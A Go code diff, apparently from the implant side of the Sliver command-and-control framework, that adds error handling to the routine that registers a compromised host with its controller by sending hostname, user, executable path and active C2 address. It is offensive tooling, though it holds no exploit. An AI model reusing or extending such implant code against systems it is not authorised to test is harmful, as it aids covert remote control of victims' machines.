@@ -104,15 +104,35 @@ func mainLoop(connection *transports.Connection) {
 }
 
 func getRegisterSliver() *pb.Envelope {
-	hostname, _ := os.Hostname()
-	currentUser, _ := user.Current()
+	hostname, err := os.Hostname()
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Failed to determine hostname %s", err)
+		// {{end}}
+		hostname = ""
+	}
+	currentUser, err := user.Current()
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Failed to determine current user %s", err)
+		// {{end}}
+		currentUser = &user.User{
+			Username: "<< error >>",
+			Uid:      "<< error >>",
+			Gid:      "<< error >>",
+		}
+	}
 	filename, err := os.Executable()
 	// Should not happen, but still...
 	if err != nil {
 		//TODO: build the absolute path to os.Args[0]
-		filename = os.Args[0]
+		if 0 < len(os.Args) {
+			filename = os.Args[0]
+		} else {
+			filename = "<< error >>"
+		}
 	}
-	data, _ := proto.Marshal(&pb.Register{
+	data, err := proto.Marshal(&pb.Register{
 		Name:     consts.SliverName,
 		Hostname: hostname,
 		Username: currentUser.Username,
@@ -124,6 +144,12 @@ func getRegisterSliver() *pb.Envelope {
 		Filename: filename,
 		ActiveC2: transports.GetActiveC2(),
 	})
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Failed to encode Register msg %s", err)
+		// {{end}}
+		return nil
+	}
 	return &pb.Envelope{
 		Type: pb.MsgRegister,
 		Data: data,
